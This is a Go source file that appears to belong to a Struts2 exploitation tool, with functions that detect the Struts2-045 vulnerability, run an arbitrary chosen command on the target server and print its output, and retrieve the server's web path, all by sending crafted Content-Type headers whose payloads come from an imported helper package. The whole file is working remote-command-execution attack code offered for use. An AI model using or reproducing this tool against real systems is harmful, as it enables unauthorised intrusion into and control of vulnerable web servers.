package s045

import (
	"ST2G/cvemod/x51utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)



func Check(url string) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, nil)
	req.Header.Set("Content-Type", x51utils.POC_s045_check)
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	if err != nil {
		log.Fatal("Error reading request. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	isVulable := strings.Contains(respBody, x51utils.Checkflag)
	if isVulable {
		x51utils.Colorlog("Found Struts2-045!")
	} else {
		fmt.Println("Struts2-045 Not Vulnerable.")
	}

}

func ExecCommand(url string,command string)  {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, nil)
	req.Header.Set("Content-Type", x51utils.POC_s045_exec(command))
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println(command,respBody)
}

func GetWebpath(url string){

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, nil)
	req.Header.Set("Content-Type", x51utils.POC_s045_webpath)
	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
	if err != nil {
		log.Fatal("Error reading body. ")
	}
	response, _ := client.Do(req)
	defer response.Body.Close()
	content, _ := ioutil.ReadAll(response.Body)
	respBody := string(content)
	fmt.Println("WebPath：",respBody)
}
